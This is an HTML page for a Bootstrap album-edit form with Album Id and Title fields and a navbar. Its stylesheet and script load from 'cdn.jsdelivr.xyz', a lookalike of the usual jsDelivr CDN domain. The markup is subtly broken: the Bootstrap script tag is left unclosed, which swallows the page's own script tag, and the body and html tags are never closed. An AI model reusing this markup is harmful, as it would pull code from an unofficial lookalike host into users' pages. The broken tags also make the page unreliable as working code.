<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css"

      integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="/assets/css/style.css" />
    <title>Document</title>
  </head>
  <body>
    <nav class="navbar navbar-expand-lg bg-warning">
        <button
        class="navbar-toggler"
        type="button"
        data-mdb-toggle="collapse"
        data-mdb-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent"
        aria-expanded="false"
        aria-label="Toggle navigation"
      >
        <i class="fas fa-bars"></i>
      </button>
      <div class="container d-flex justify-content-center">
        <div class="row">
          <div class="col-12 d-flex justify-content-center mb-3">
            <a class="navbar-brand" href="#"
            ><img
              id="MDB-logo"
              src="https://mdbcdn.b-cdn.net/wp-content/uploads/2018/06/logo-mdb-jquery-small.png"
              alt="MDB Logo"
              draggable="false"
              height="30"
          /></a>
          </div>
          <div class="col-12 d-flex justify-content-center">
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
              <ul class="navbar-nav align-items-center mx-auto">
                <li class="nav-item">
                  <a class="nav-link mx-2" href="#!"><i class="fas fa-plus-circle pe-2"></i>Post</a>
                </li>
                <li class="nav-item">
                  <a class="nav-link mx-2" href="#!"><i class="fas fa-bell pe-2"></i>Login</a>
                </li>
                <li class="nav-item">
                  <a class="nav-link mx-2" href="#!"><i class="fas fa-heart pe-2"></i>Register</a>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </nav>
    <div class="container my-5">
      <form action="index.html" >
        <div class="mb-3">
          <label for="albumId" class="form-label">Album Id</label>
          <input type="number" class="form-control" id="albumId">
        </div>
        <div class="mb-3">
          <label for="title" class="form-label">Title</label>
          <textarea class="form-control" id="title" rows="3"></textarea>
        </div>
        <div class="col-auto">
          <button type="submit" class="btn btn-warning mb-3">Save</button>
          <button type="cancel" class="btn btn-danger mb-3" onclick="javascript:window.location='index.html'">Cancel</button>
        </div>
      </div>
      </form>
    <script
      src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm"

    <script src="/assets/js/editScript.js"></script>
